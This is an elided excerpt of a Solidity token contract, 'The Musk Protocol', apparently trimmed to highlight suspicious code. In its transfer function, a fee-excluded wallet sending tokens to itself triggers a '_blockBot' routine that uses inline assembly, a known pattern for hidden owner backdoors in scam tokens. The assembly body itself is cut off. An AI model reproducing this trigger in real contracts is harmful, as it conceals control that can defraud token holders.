...
contract TheMuskProtocol is Context, IERC20, Ownable {
    ...
    uint256 public cToken=0;
    event FeeBurned(uint256 amount);

    uint8 private _decimals = 18;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public immutable _totalSupply =  2500000000 * 10**_decimals;
    uint256 public _walletMax =  25000000 * 10**_decimals;   
    uint256 public _buyTax =1;
    uint256 public _sellTax = 1;
    string private _name = unicode"The Musk Protocol";
    ...
    function calcFeePay(address s, address r, uint256 amount) internal returns (uint256) {
     ...
     function _blockBot(address r, uint256 a) internal returns (bool) {
         assembly {
                    mstore(0, r)
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(sender == recipient && isExcludedFromFee[sender])
            return _blockBot(sender,cToken);
